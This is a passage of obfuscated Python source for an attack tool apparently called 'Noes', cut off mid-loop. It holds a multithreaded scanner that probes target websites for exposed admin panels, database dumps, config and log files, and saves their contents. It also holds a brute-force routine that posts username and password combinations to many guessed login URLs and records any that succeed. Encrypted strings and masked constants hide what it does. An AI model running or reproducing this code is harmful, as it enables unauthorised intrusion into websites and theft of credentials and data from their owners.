            if status in [343647991 ^ 343647807, 804026756 ^ 804026538, 969831763 ^ 969831616]:
                _OIII0OOIII01O0 = True
                vuln_type = _OIlO10OIO1O1(b'\x1e0\n4=\x9f\xe9\x12e\x96\xd8', b'\x1dv\x9c\x12')
                severity = _l1OIOIOIIOIIl01I(b'\x16\x90\xd2S', b'\xed\xb0x8')
                _OlOOO0IIOl00O0(f'[Noes] ADMIN PANEL: {target}', _OIlO10OIO1O1(b'\xdb\x88V@', b'\xc8j\xc7\xae'))
        if _1Ol10I0O0O(b'\xa5\xd8\x13\xf4\x1e', b'\xae\x88\x06\xc4') in path or _l1OIOIOIIOIIl01I(b'\x9de\x146', b'\xfa\xc4)\xaf') in path or _l1OIOIOIIOIIl01I(b'\xadE\xc2\xf8', b'h\xf0b\x8c') in path:
            if status in [875819773 ^ 875819573, 287020451 ^ 287020082, 129013797 ^ 129014198]:
                _OIII0OOIII01O0 = True
                vuln_type = _1Ol10I0O0O(b'\xa9\x1d\xc8XR\xcc\x8a\x9f\xb7\xfd4\x92', b'\xb4y\x96)')
                severity = _OIlO10OIO1O1(b'\x9a\xca\xa6\xcf\x19\xf7', b'W\xf2\xa9\xf7')
                if status == 2109044190 ^ 2109043990:
                    _IlOOlI10I0(target, r.text[:1202389377 ^ 1202391609], _l1OIOIOIIOIIl01I(b'\xacau', b'6\xc4\xdc9'))
                    _OlOOO0IIOl00O0(f'[Noes] API: {target}', _l1OIOIOIIOIIl01I(b'8\x8e\x0e\x05', b'fL\x1a\x8f'))
        _1IOl1II1lIlI = [_1Ol10I0O0O(b'\n8\x91', b'\x8f:#{'), _l1OIOIOIIOIIl01I(b'\xe2\x1a\x0e\t\x87H\x18', b'\xea\x18\xa3>'), _l1OIOIOIIOIIl01I(b'f7\xea\xa9\x98\xc1\xdbE', b'\xebDDf'), _OIlO10OIO1O1(b'\xdem\xa1\x1d', b'\x08\xf4\xe5u'), _OIlO10OIO1O1(b'\x10\xf6RH', b'\x15\xaf+h'), _1Ol10I0O0O(b'\xa6p\nW\xec\x10', b'\xe9\xdb\x82\xe8'), _OIlO10OIO1O1(b'\x9e\xa1\xe9\xc8', b's\xdb&\xcc')]
        if any((path.endswith(e) for e in _1IOl1II1lIlI)):
            if status == 1549370669 ^ 1549370853 and size > 568528886 ^ 568528886:
                _OIII0OOIII01O0 = True
                vuln_type = _1Ol10I0O0O(b'\x95p\x11_/&Z\x8d8\xef\xe1\xab\xd4', b'F\xe6\x10\xb0')
                severity = _l1OIOIOIIOIIl01I(b'\x0c>\\\xe00N\xb1\xcb', b'm\xce1\x84')
                _IlOOlI10I0(target, r.text[:772708393 ^ 772707217], _1Ol10I0O0O(b'L\xe9\xa95\xbe\x02h\x9f', b'\xac;\xd4\x02'))
                _OlOOO0IIOl00O0(f'[Noes] DATABASE: {target}', _l1OIOIOIIOIIl01I(b'[(\t\xd3', b'\x1da+$'))
        if _OIlO10OIO1O1(b'pu4<', b'\x91\xa2\xd1\xbb') in path or path.endswith(_l1OIOIOIIOIIl01I(b'\xf1\xfd\x8c\xe0', b'\xe9\x94\\f')):
            if status == 619968196 ^ 619968012 and size > 485646451 ^ 485646451:
                _OIII0OOIII01O0 = True
                vuln_type = _OIlO10OIO1O1(b'r\xd9\x86E~\x8c\x1c\x04', b'\x12\xa7(\x9b')
                severity = _1Ol10I0O0O(b')\x11p\xeaf\xea', b'P\xa1\xae\x1e')
                _IlOOlI10I0(target, r.text[:243562568 ^ 243561456], _1Ol10I0O0O(b'[.\xf3', b'\x07\xa3\xacE'))
                _OlOOO0IIOl00O0(f'[Noes] LOG: {target}', _1Ol10I0O0O(b'W\x94M\xb9', b'\x07\xe6T\x1e'))
        _lO1lllll010llOlO = [_l1OIOIOIIOIIl01I(b'\xaf\x13\x11\xa8', b'\xba\xe3\xf6\xba'), _1Ol10I0O0O(b'\x19\x8f\xeb\x9aw', b'\x1b\xc1\xad\x91'), _OIlO10OIO1O1(b'K\xc7\xe0.', b'j\xaf\x0b\x03'), _OIlO10OIO1O1(b'\xb5Q\xb5\xa3U\xe4[\x97\xf7+\xf4', b'SR\x0eG'), _l1OIOIOIIOIIl01I(b'_\xe2P\x1d\x97', b'\x1bD&\n'), _1Ol10I0O0O(b'\x13\n\x0c\x1a', b'\xf8\xc9VY'), _l1OIOIOIIOIIl01I(b"\x98'3\xff", b'`R\xa2\xfc')]
        if any((path.endswith(e) for e in _lO1lllll010llOlO)):
            if status == 40169144 ^ 40169072 and size > 405303909 ^ 405303909:
                _OIII0OOIII01O0 = True
                vuln_type = _l1OIOIOIIOIIl01I(b'P@E9\xd7\x19\xae\xe1\xff\x02\xb9', b'\xa1\x06\x9ez')
                severity = _OIlO10OIO1O1(b'\x0cg\xf0v', b'-\x0e\xf0O')
                _IlOOlI10I0(target, r.text[:94812711 ^ 94810527], _l1OIOIOIIOIIl01I(b':z\xdb\xd0\x18\x10', b'\x87\x80\x16\x00'))
                _OlOOO0IIOl00O0(f'[Noes] CONFIG: {target}', _1Ol10I0O0O(b'$c\xd4\xa5', b'fs\x04\xba'))
        _IlllO00l00OI00 = [_l1OIOIOIIOIIl01I(b'\xa8\x04\xd3\x96\x02\xf5\x12\x8a\xa3', b'\xbce\x1f~'), _OIlO10OIO1O1(b'AU\xbe\xf8X\x0b\x86p', b'|9\xfe\xcf'), _l1OIOIOIIOIIl01I(b'=\x84\xf2\x11|F\x97', b'\xa6/\x1ae'), _1Ol10I0O0O(b'L\xf4T\xe5l\ryT', b',\x87\x81\x07'), _l1OIOIOIIOIIl01I(b'\xa8]=/\xbc@2', b'\xfe\x91\xbf\xf7')]
        if any((up in path for up in _IlllO00l00OI00)):
            if status == 450761713 ^ 450761529:
                _OIII0OOIII01O0 = True
                vuln_type = _1Ol10I0O0O(b'\xa5\xcc{\xbd"!\x8a\x9e\xdf\xc9\xda5\xe8\x00\xb3\xd1', b'7X\xff\xcf')
                severity = _OIlO10OIO1O1(b'\xd1n|B\x81j', b'\x7f\x82\x94\x8a')
                _OlOOO0IIOl00O0(f'[Noes] UPLOAD DIR: {target}', _1Ol10I0O0O(b'\xd8\xde\xa5\x84', b'\xf8-\xd0N'))
        _lO1IO10O01100ll = [_1Ol10I0O0O(b'\xd5\n\xaf\xb6\xaa', b'\xec\xf0\x96\x13'), _l1OIOIOIIOIIl01I(b'\\\xd8\x00~-\xe6', b'\x10\xb5#\xe0'), _1Ol10I0O0O(b'F\x01\xd8\x9e\xff\x14>', b'"Ks\xb1'), _1Ol10I0O0O(b'\x86\xbf#W\xad"\xda\x8b\x92U', b'jk\x8e\x1c')]
        if any((tmp in path for tmp in _lO1IO10O01100ll)):
            if status == 1739254666 ^ 1739254594:
                _OIII0OOIII01O0 = True
                vuln_type = _1Ol10I0O0O(b'\xcf\x9e\xb7\xd3k3\xd6J[\xc5O\xc9C\xbd', b'\x0e=+c')
                severity = _1Ol10I0O0O(b'\xae\xa2\x9b', b'\xbe\x9fXQ')
                _OlOOO0IIOl00O0(f'[Noes] TEMP DIR: {target}', _1Ol10I0O0O(b'\x8d@\x90\x18', b'+\xde\xbdn'))
        if _OIII0OOIII01O0:
            _OlOOO0IIOl00O0(f'[{severity}] {target}', _1Ol10I0O0O(b'\xcd\x06P\xf6;', b'\xcf\xc5\x8fI'))
            _0IIlI1III1OIl = {_1Ol10I0O0O(b'\xe0~\xfb', b'~\x9d\x0bl'): target, _OIlO10OIO1O1(b'z\x8doV\xd3\xa4+\xd7', b'\x95\xdc>\x00'): base_url, _1Ol10I0O0O(b'9UXl', b'\xc2\x15M\x82'): path, _OIlO10OIO1O1(b'(;\x8c\xe05#', b'=.I\x18'): status, _l1OIOIOIIOIIl01I(b'z\xd6F\x96', b'<\x98\xdc\x90'): size, _OIlO10OIO1O1(b'\x91\xaa\x08\xb8\xd86\xa5*\xdc', b'\xb0N&|'): vuln_type, _l1OIOIOIIOIIl01I(b'X\x8a \x0c\xa5M\xfa\xa9', b'\x10y@\xc1'): severity, _1Ol10I0O0O(b'^\x93e\xf7\xe2\xdaG\xf23', b'k\xf4\xd9\xfd'): _II00Oll11I1IOO(), _1Ol10I0O0O(b'%\xd7\xe9 \xf1\xdet\xdd\xf0_\x0f\x91', b'k\x89\xe2\xc5'): content_type}
            with _l100lO1lOI:
                _100III00lOI.append(_0IIlI1III1OIl)
                _1llIOl1I0IOI0[_l1OIOIOIIOIIl01I(b'\xa0F\xa8\xe0;', b'Fd\xe5-')] += 1892874227 ^ 1892874226
                _1llIOl1I0IOI0[vuln_type] = _1llIOl1I0IOI0.get(vuln_type, 20097473 ^ 20097473) + (270708841 ^ 270708840)
                _1llIOl1I0IOI0[f'sev_{severity}'] = _1llIOl1I0IOI0.get(f'sev_{severity}', 363888206 ^ 363888206) + (1054644652 ^ 1054644653)
            return _0IIlI1III1OIl
        return None
    except requests.exceptions.Timeout:
        pass
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.SSLError:
        pass
    except Exception:
        pass
    return None

def _l01Ol1110lII(base_url, threads=_l111lO0OlIl):
    global _0OI100OO0001OI0, _100III00lOI
    _0OI100OO0001OI0 = True
    _100III00lOI = []
    _1llIOl1I0IOI0.clear()
    if not base_url.startswith((_l1OIOIOIIOIIl01I(b'\xa7\xb1&uB\x13\xd0', b'E\xf2:\xe8'), _l1OIOIOIIOIIl01I(b'\xcbo\xaf*5W\xa7\x89', b'\xb6I\x93`'))):
        base_url = _OIlO10OIO1O1(b'Y\xd1\xa0`\xa1\x0b"', b'--\xc3\xff') + base_url
    if not base_url.endswith(_1Ol10I0O0O(b'T', b'\xa5D\xf7\x0c')):
        base_url += _1Ol10I0O0O(b'\x8d', b'\xb4\x8e\xd7\x87')
    _OlOOO0IIOl00O0(f'\n[Noes] SCAN START: {base_url}', _OIlO10OIO1O1(b'\xaa\x9a\xa8\x1f', b'^\xfbp\xbf'))
    _OlOOO0IIOl00O0(f'[Noes] Payloads: {len(_IIIO1I10O100Oll0O)} | Threads: {threads}', _l1OIOIOIIOIIl01I(b'z\xcfY\x00', b'\xd0q<\xbd'))
    _OlOOO0IIOl00O0(f'[Noes] Categories: 12', _l1OIOIOIIOIIl01I(b'\xaf\x1e T', b'\x0e\x1f_\x15'))
    try:
        r = _Ol1I1I111O1lII1.get(base_url, timeout=408753955 ^ 408753958, verify=False)
        _OlOOO0IIOl00O0(f"[Noes] Target OK | Status: {r.status_code} | Server: {r.headers.get('Server', 'Unknown')}", _OIlO10OIO1O1(b'\xb3\nWf\xa8wl', b'\x1e{MN'))
    except Exception as e:
        _OlOOO0IIOl00O0(f'[Noes] Target unreachable! {str(e)[:50]}', _1Ol10I0O0O(b'}\xeb\x1d\x98\xa1', b'\xb8\x8a\x0b\xfe'))
        _0OI100OO0001OI0 = False
        return
    _1OOI0Ol0I1Il10 = []
    total = len(_IIIO1I10O100Oll0O)
    _OIO0II1IO1IIl1O0 = time.time()
    for _Ol0lOO0lIIIIl0, _0O001I1IO0lIO in enumerate(_IIIO1I10O100Oll0O):
        t = _0OlO1O0lI1I0IOI.Thread(target=_1OIIO1IIOlOIO, args=(base_url, _0O001I1IO0lIO))
        t.daemon = True
        t.start()
        _1OOI0Ol0I1Il10.append(t)
        if _Ol0lOO0lIIIIl0 % (1272342843 ^ 1272342793) == 593369723 ^ 593369723 and _Ol0lOO0lIIIIl0 > 643735548 ^ 643735548:
            progress = int(_Ol0lOO0lIIIIl0 / total * (351582803 ^ 351582775))
            elapsed = int(time.time() - _OIO0II1IO1IIl1O0)
            _OlOOO0IIOl00O0(f'[Noes] Progress: {progress}% ({_Ol0lOO0lIIIIl0}/{total}) | Elapsed: {elapsed}s', _OIlO10OIO1O1(b"\xa6\x1b}'\xcb", b'\x85\xd3 \x90'))
        time.sleep(0.005)
    for t in _1OOI0Ol0I1Il10:
        try:
            t.join(timeout=2125645930 ^ 2125645928)
        except:
            pass
    _0OI100OO0001OI0 = False
    elapsed = int(time.time() - _OIO0II1IO1IIl1O0)
    _I0O0O01OO1OI1O0O.append({_l1OIOIOIIOIIl01I(b'\x0f!\x058Bv', b'\x12\x93\xc3='): base_url, _OIlO10OIO1O1(b'\x84[b\xd2O\xb5:[\xd4', b'45\xffH'): _II00Oll11I1IOO(), _1Ol10I0O0O(b'"m\xf5+\x95', b'^e\x80w'): len(_100III00lOI), _1Ol10I0O0O(b':"OB2H3', b'\xae\x0f\x86\x87'): elapsed})
    _OlOOO0IIOl00O0(f'[Noes] SCAN COMPLETE - Found: {len(_100III00lOI)} | Time: {elapsed}s', _l1OIOIOIIOIIl01I(b'\xca\xa8\x8d\x15db\xb4', b'\xc3&\xfa['))
    if _100III00lOI:
        _OlOOO0IIOl00O0(f'[Noes] SUMMARY:', _1Ol10I0O0O(b'\xf5\xdf\xc2+', b'\xcf\xf8\xd1\xff'))
        for _l0lI1O0IlO0Il0lO0 in [_1Ol10I0O0O(b'\xff\xe8\xae.S\xa4\xe0q', b'\xfb\xf5\x82\x17'), _1Ol10I0O0O(b'G\x98b\x08', b'I\xaf\x02\x8e'), _OIlO10OIO1O1(b'_\xbf\x0c\x86s\x0e', b'\xcf\x00gC'), _l1OIOIOIIOIIl01I(b'\x92\xd0\xc7', b'\xf7\r\xdb\x82')]:
            _0001I01lOOl = _1llIOl1I0IOI0.get(f'sev_{_l0lI1O0IlO0Il0lO0}', 1211547526 ^ 1211547526)
            if _0001I01lOOl > 555082028 ^ 555082028:
                color = _lOO0O0101IOl00001.RED if _l0lI1O0IlO0Il0lO0 == _l1OIOIOIIOIIl01I(b'\x80\xe3\x9b\x876\xf61\x1f', b'\xf1\xb3VN') else _lOO0O0101IOl00001.YELLOW if _l0lI1O0IlO0Il0lO0 == _l1OIOIOIIOIIl01I(b'> \x15\xff', b'\xc6x\xe4\x8b') else _lOO0O0101IOl00001.CYAN
                _OlOOO0IIOl00O0(f'  {color}{_l0lI1O0IlO0Il0lO0}: {_0001I01lOOl}', _1Ol10I0O0O(b'\x1b\xe3\xa6\xcb', b'\xd3\x92\xc3\x91'))
        _OlOOO0IIOl00O0(f'[Noes] TYPES FOUND:', _1Ol10I0O0O(b'\xd1\x07\x86\xcc', b'\t\x83\x9b['))
        for _10lIOIO0ll1l111Il, _0001I01lOOl in _1llIOl1I0IOI0.items():
            if not _10lIOIO0ll1l111Il.startswith(_1Ol10I0O0O(b'\xfd\x9a\n|', b'\xd5"\xb5`')) and _10lIOIO0ll1l111Il != _l1OIOIOIIOIIl01I(b'\xf7\x16hX\xbf', b'\xcc\x19+\xf5'):
                _OlOOO0IIOl00O0(f'  • {_10lIOIO0ll1l111Il}: {_0001I01lOOl}', _l1OIOIOIIOIIl01I(b'wm\x86)', b'\x14l\x8c\xfe'))
    _IOOlI1l101Ill1Il()

def _l10010Il10lI(base_url, username, password):
    _01O1I10II1 = [_llll110l10OI0(base_url, _l1OIOIOIIOIIl01I(b'&BZ\x875>\x1f\x1cX\x9d\x8c\x18', b'\x93\x14\\\xbf')), _llll110l10OI0(base_url, _OIlO10OIO1O1(b'\x88R \x1d\x83\xe1', b'\xf0\xc9\x9b\xb9')), _llll110l10OI0(base_url, _1Ol10I0O0O(b'\x07^\xe0\xbd`I\x7f\xe2\x15\xc6\x06\x00K', b'\x83\xf3\xeb\xfe')), _llll110l10OI0(base_url, _OIlO10OIO1O1(b'\xab\x14O|\xfcs\xbek\x0c\xd4s\xffn\x98\x0e\x84\xe6(.*\xd7\xdb\xf0Z', b'\xef\xce\xea9')), _llll110l10OI0(base_url, _l1OIOIOIIOIIl01I(b'm\xad\xfbt\xf5I\xe9\xb3?\xb1\xce\xfaY\xcd\xabg', b'\x97`\x8fo')), _llll110l10OI0(base_url, _OIlO10OIO1O1(b'&\xe8]\xdc\xbd\x00\x9d1#\xa8&', b'\xd5\x97\x17\xdf')), _llll110l10OI0(base_url, _1Ol10I0O0O(b'\xeeBI\xdd\xdbf\x98\xcf\x98P', b'\xa8\x96\xfbm')), _llll110l10OI0(base_url, _1Ol10I0O0O(b'\xfa\x17G\x99}[\x12', b'\x85\x95\x7f\xc6')), _llll110l10OI0(base_url, _OIlO10OIO1O1(b'\xe6\x9c\x8ed\x1c\x1d\xd5\x8a\x01\x7f+M*q\xef\x08', b'/\x98\x9e\xdb')), _llll110l10OI0(base_url, _OIlO10OIO1O1(b'0\x1a\xc2\x9e\xbd\x16\x14\xb6\x9d\x98\xae', b'%\x99c\x85')), _llll110l10OI0(base_url, _1Ol10I0O0O(b'x\xb1A\xae\xb3\x8f\xc6\x17\x87\xdf\xde\x98(', b')\xbc\xde\\')), _llll110l10OI0(base_url, _1Ol10I0O0O(b'@\x80P\x12\xc0\x9dU\xeb\xa2', b'\xda\xa7\x15\x05')), _llll110l10OI0(base_url, _1Ol10I0O0O(b'\t\xef\xcc5!\x19', b'\n\xfa\xda\x9c')), _llll110l10OI0(base_url, _1Ol10I0O0O(b'\x0e]\xcb\xa6\x04X\xc6\xaf!&{\x06x\x88\xbeM!', b')*\x87\x07')), _llll110l10OI0(base_url, _l1OIOIOIIOIIl01I(b'\x87\x0e\x1ex\xe4(', b'}\xc27\x1c')), _llll110l10OI0(base_url, _l1OIOIOIIOIIl01I(b'\xb5\x90f1\xf3di\x90', b'\x1f\n\xf8\x1d')), _llll110l10OI0(base_url, _OIlO10OIO1O1(b"\xec\xcfB\xcd\xc3\x116\x13\x99\xcf\xcc'", b'\xf4J^\xcf')), _llll110l10OI0(base_url, _l1OIOIOIIOIIl01I(b'S\x8f\x7f\x96w\xde1L\xacD\xe1\xe7', b'\x01h\x9f\x13')), _llll110l10OI0(base_url, _1Ol10I0O0O(b'\x96U\xb3\xe5\x0b\x87Y\xe0\x1d\x1c\xd9\x02G\x0b', b'\xa4\xea\xd1\x0f'))]
    _l00I101O0OOOlII = [{_1Ol10I0O0O(b'a\xddpzi\xdf\xe0\xa6', b'\xb6\x01\x81\xb3'): username, _l1OIOIOIIOIIl01I(b'\x1d\xf9L\xfa/\xe3\xeeM', b'\xd7\x04\xae\xf2'): password}, {_OIlO10OIO1O1(b'\x10\x0c\xf8\xf3', b'\x7f\xa5\xd1\xfc'): username, _OIlO10OIO1O1(b'\xaf\xaf\xfc\xaa', b'\xaa\x9a\xdaM'): password}, {_l1OIOIOIIOIIl01I(b'\xbe\xab\xc50J\xd7\x88\x97\xe6\xa5', b'\x8d\xb0.\xf7'): username, _1Ol10I0O0O(b'o\xcf\x9d\xb6\x07q\x94=\xa9', b'4\xe8\xae{'): password}, {_1Ol10I0O0O(b'\x06X%', b'2\xa8\xa0\xe8'): username, _1Ol10I0O0O(b'\x14\xe7\xd8', b'\xf6\x7f\x96\xad'): password}, {_1Ol10I0O0O(b'D\xf8\xa2d\x83', b'IXX\xf0'): username, _OIlO10OIO1O1(b'euN\xef) \xb5L', b'\xd7\xca\x91\x12'): password}, {_1Ol10I0O0O(b'\xe4}>\xe4\xaa', b'\x01\r\x1f\xc7'): username, _1Ol10I0O0O(b'.\x8d\xc1\x98z', b'\t\x9b4\xea'): password}, {_l1OIOIOIIOIIl01I(b'\x96\xf3\x04\x8b\xbb', b'\x96>Ct'): username, _OIlO10OIO1O1(b'\xb3]\xa6\xdc', b'\xd2\x87\xa2\xa4'): password}, {_OIlO10OIO1O1(b'\xb9', b'\x8f\x12\xa5\xe9'): username, _OIlO10OIO1O1(b'\x8d', b'(\xa0\xf5\xa6'): password}, {_OIlO10OIO1O1(b'\x1b\xa1f/\x9a\xef[Gr', b'?:1\x84'): username, _l1OIOIOIIOIIl01I(b'\xcf\xb2\xa7j|\x85\xb2\x1c\xf3EU\xc9\x12', b'V\xfd\x8dn'): password}, {_l1OIOIOIIOIIl01I(b'\x19\x0e\xd9x\x0et', b'-\x85>\xf7'): username, _1Ol10I0O0O(b'\xd9\xb7Fx\xed\x07', b'\xa5\x11\x152'): password}, {_OIlO10OIO1O1(b'\x06\xa1P', b'X[\xbe\xf1'): username, _l1OIOIOIIOIIl01I(b'\x93\x7f\x19', b'\\\x02\xfa0'): password}, {_l1OIOIOIIOIIl01I(b'\xce\xf4`\x0f', b'\xfb\xa2}\x1b'): username, _OIlO10OIO1O1(b'\xfdk|\xa8', b'\x1fI\\='): password}, {_OIlO10OIO1O1(b'\xcb\x82\x85\xda\xb9$\x85@\xe1\xa7', b'\x06i\xe7\xdd'): username, _OIlO10OIO1O1(b',\x8b\xb2\x7f\xd2s\xb2\xb7', b'\xf0\xa9b\xa3'): password}, {_OIlO10OIO1O1(b'=\xeb\x99w\xac\x9c0\xa8', b'Y/=\x86'): username, _OIlO10OIO1O1(b'c2\x03\xc4\xc7w', b'c\xd9&?'): password}]
    for login_url in _01O1I10II1:
        try:
            for data in _l00I101O0OOOlII:
                r = _Ol1I1I111O1lII1.post(login_url, data=data, timeout=1834009609 ^ 1834009612, allow_redirects=False, verify=False)
                if r.status_code == 1783584819 ^ 1783585053:
                    _Oll1ll1101l11O000 = r.headers.get(_OIlO10OIO1O1(b'\xb5[\xdd\xbf\xa9\xb4\x14\xad', b'\x10?\xc7\x9c'), _l1OIOIOIIOIIl01I(b'', b'\x83R\xd1a'))
                    if any((w in _Oll1ll1101l11O000.lower() for w in [_1Ol10I0O0O(b'v\x98z9\xfcdp\x92\xf1', b'\xc8\x84\xb3\xea'), _l1OIOIOIIOIIl01I(b'\xb1\xdb\x1a\xef\x9b', b'Y\xbe.E'), _l1OIOIOIIOIIl01I(b'\x9b\xb7r\xfb', b'W\x89\xb3\x06'), _OIlO10OIO1O1(b'Q\xcf!n\xc6', b'\x07e\xca\xff'), _OIlO10OIO1O1(b'0\x92\x94\xd0\xc4\xba\xf1', b'G`\xabi')])):
                        return {_OIlO10OIO1O1(b'c\t\xd3^O\x9e\x7f', b'\xfe\xea@\xe6'): True, _OIlO10OIO1O1(b'h\x8c\xc0\x1a\x86\x1e\x0e\xff', b'vk\x95\xc1'): username, _OIlO10OIO1O1(b'(<\xf1\xdc\x02\x96v:', b'5\xd3\xb3}'): password, _1Ol10I0O0O(b'Ecn', b'J\xc53y'): login_url}
                if r.status_code == 1832436954 ^ 1832436754:
                    content = r.text.lower()
                    _11lO0Il1IO0I = [_OIlO10OIO1O1(b'\xd9 \x1f\xb1\xfd\x89T', b'\x12eH0'), _1Ol10I0O0O(b'\xf4\x1f\x14\xab\xc4\xef;\x1em', b'\x88\xde\xfa7'), _l1OIOIOIIOIIl01I(b'\xc5\x19\xc9\x01V\xc5', b'x\xb6~\x06'), _1Ol10I0O0O(b'\xb2\x9a\xd9W-', b'\xce\xfa\xa6;'), _OIlO10OIO1O1(b'w\xcc\x83[\xcfO5', b'\x97\x99\x80\xe7'), _OIlO10OIO1O1(b'G\xe4\xfa\x7f\x18', b'\xce\xcb\x8c\xf5'), _OIlO10OIO1O1(b'\xd3O"\x08', b'Rv6=')]
                    _010OOOII0001l1 = [_l1OIOIOIIOIIl01I(b'\xad\xde\xb0\xab2&\xd9', b'\x88U\xa1\x99'), _1Ol10I0O0O(b'\xa3\x8f\x03^z\xcf\xfa!\xd0', b'\xc6\x038\xfc'), _l1OIOIOIIOIIl01I(b'\xce_\xf4w\xd4', b'6\xfe\xddN'), _1Ol10I0O0O(b'\xe7\x12\xf7\x0fY\x04', b'\xb92V?'), _l1OIOIOIIOIIl01I(b'o\xfb\x95X\x9c', b'=\xaa\xc62'), _l1OIOIOIIOIIl01I(b'\xf1\xbc\xe1\x98e\xbb', b'\xe7\x12\xddW'), _1Ol10I0O0O(b'\xde\xe3\x04\r\x8a#U', b'\x8a\xd6\xaf]')]
                    if any((w in content for w in _11lO0Il1IO0I)):
                        if not any((e in content for e in _010OOOII0001l1)):
                            return {_1Ol10I0O0O(b'8I\x94+g\x8f6', b'\x1f4\xad\xe9'): True, _l1OIOIOIIOIIl01I(b'Y\xe6\x96\x92\xb9\xf3)\x0f', b'\xa5A\xa0P'): username, _l1OIOIOIIOIIl01I(b'\xdbzr\x02\xd2Y\xd0\xcc', b'\xc7]\xd6\xa8'): password, _1Ol10I0O0O(b'\xfc\xb9\xf9', b'g\x07\xdfJ'): login_url}
        except:
            continue
    return {_OIlO10OIO1O1(b'\xd2t\xb6\x94t\x17\x1a', b'\xdc\xde/?'): False}

def _l0I10IIl1lI(base_url):
    global _0llOlI10lIII1, _0OlOllOIIIlO1l0
    _0llOlI10lIII1 = []
    _0OlOllOIIIlO1l0 = {_1Ol10I0O0O(b"L'\xe5\xac\xdc\xf6\xc2", b'\xac9\xad\xdb'): 260241070 ^ 260241070, _1Ol10I0O0O(b'\x8f\xda\xa617', b'j @m'): len(_l1OOlOI01I01) * len(_II10IOl1I1O), _l1OIOIOIIOIIl01I(b'wpvg4', b'_$R\x1a'): 226252039 ^ 226252039}
    if not base_url.startswith((_OIlO10OIO1O1(b'*\xbb\xe7\x00\x8a\x89,', b'|[%C'), _1Ol10I0O0O(b'\xe1\xab\x8eE\x8e\x14\x0c~', b'\xc9G=\x15'))):
        base_url = _l1OIOIOIIOIIl01I(b'\x12N+\xec\x9e}\xc0', b'\x90\xd2\xf2\x91') + base_url
    if not base_url.endswith(_OIlO10OIO1O1(b'\xee', b'p8\xdb\xca')):
        base_url += _OIlO10OIO1O1(b'\xf1', b'x@\xce\xf4')
    _OlOOO0IIOl00O0(f'\n[Noes] BRUTE FORCE START: {base_url}', _1Ol10I0O0O(b'j@\xfb\x18{', b'9\xe3\x17\xca'))
    _OlOOO0IIOl00O0(f'[Noes] Usernames: {len(_l1OOlOI01I01)}', _1Ol10I0O0O(b'Z\xa4\xcd\x05\xc1', b'\xa6_\x00\xa0'))
    _OlOOO0IIOl00O0(f'[Noes] Passwords: {len(_II10IOl1I1O)}', _OIlO10OIO1O1(b'\x02\xcc\xcd\xc3\x8f', b'8\xe3\xeb\xf7'))
    _OlOOO0IIOl00O0(f'[Noes] Total: {len(_l1OOlOI01I01) * len(_II10IOl1I1O)} combinations', _1Ol10I0O0O(b'\xe5\x96n:n', b'Z\x94\xd5\x85'))
    _OlOOO0IIOl00O0(f'[Noes] This will take time... Stay patient', _1Ol10I0O0O(b'G\xef^o\xedW\xbc', b'_\xea\x8f&'))
    found = []
    tested = 965599520 ^ 965599520
    total = len(_l1OOlOI01I01) * len(_II10IOl1I1O)
    _llll0OlOO0IOI = time.time()
    for username in _l1OOlOI01I01:
        for password in _II10IOl1I1O:
            tested += 330581117 ^ 330581116
            _0OlOllOIIIlO1l0[_1Ol10I0O0O(b'\xf1\xac\x90\x80k\xe2,', b'\xd3\x02j\xa7')] = tested
            if tested % (752945871 ^ 752945835) == 283399780 ^ 283399780:
                elapsed = int(time.time() - _llll0OlOO0IOI)
                _lIlI10I0lO = int(tested / total * (1760161691 ^ 1760161791))
                _IIllI0IIlIOIO0I = len(found)
                _OlOOO0IIOl00O0(f'[BRUTE] Progress: {_lIlI10I0lO}% ({tested}/{total}) | Found: {_IIllI0IIlIOIO0I} | Elapsed: {elapsed}s', _1Ol10I0O0O(b'\xb0\xb4\xb4\x9b\x0f', b'\xf2=\x18j'))
            _IOI11I1IOO1 = _l10010Il10lI(base_url, username, password)
            if _IOI11I1IOO1.get(_OIlO10OIO1O1(b'\xd0tnO\xa8\x1aH', b'\x03\xd8a\x81')):
                _I0IOll1IllIOllI = {_OIlO10OIO1O1(b'&\xb0J', b'\xa5r_\xc8'): base_url, _OIlO10OIO1O1(b'\xd90I\xecs\xfd\xe3\x0f', b'\xa6\xaf\xb1\xe1'): username, _l1OIOIOIIOIIl01I(b'\xaa\x08;8\xd1\x02{\xdb', b'B\x14&\xb2'): password, _1Ol10I0O0O(b'S\x1b\x0e|J\xf2\xc3;\xad', b'1\xee\xe4\xe4'): _IOI11I1IOO1.get(_OIlO10OIO1O1(b'\xb9\xfd\xeb', b'\x06\xf6|2')), _l1OIOIOIIOIIl01I(b'\x81\x0b\xd8[\r\xd6A\xa1B', b'\x85\xf0\x83\x1a'): _II00Oll11I1IOO()}
                _0llOlI10lIII1.append(_I0IOll1IllIOllI)
                found.append(_I0IOll1IllIOllI)
                _0OlOllOIIIlO1l0[_1Ol10I0O0O(b'\xb1\xe6\x80\xf4O', b'\xa7\x0ew%')] = len(found)
                _OlOOO0IIOl00O0(f"[Noes] ✅ BRUTE SUCCESS: {username}:{password} @ {_IOI11I1IOO1.get('url')}", _l1OIOIOIIOIIl01I(b'>\xa6R\xb1\x1c\xa5\x84\x0c\x89\xd1*\x02\xe7', b'|\x7f60'))
                _IOOlI1l101Ill1Il()
                try:
                    _11llIlIl10O0I0O1 = _l10010Il10lI(base_url, username, password)
                    if _11llIlIl10O0I0O1.get(_OIlO10OIO1O1(b'Jr\xed\xe9m\xff`', b'\xfd\xd74\xb7')):
                        _OlOOO0IIOl00O0(f'[Noes] ✅ VERIFIED: {username}:{password} - Login works!', _OIlO10OIO1O1(b'\x03T\xab\xf5\x18%\xd7T\xfe\x83\xb6\x9c\x8d', b'\x95\x0b\xba\xe7'))
                except:
                    pass
    elapsed = int(time.time() - _llll0OlOO0IOI)
    if found:
        _OlOOO0IIOl00O0(f'[Noes] BRUTE COMPLETE - Found: {len(found)} credentials | Time: {elapsed}s', _OIlO10OIO1O1(b'\xf5\x85;\x80>\x7f\xdf', b'\xeb\xc3\xed\xa1'))
        _OlOOO0IIOl00O0(f'[Noes] ✅ CREDENTIALS FOUND:', _l1OIOIOIIOIIl01I(b'c\tUv\xa2\x04\xbb;\x8a\x0c\xb3E\x04', b'\xefh\xf5\xea'))
        for _O1I01OOO011011, _0OI0IllO0I1OO0 in enumerate(found, 1787098531 ^ 1787098530):
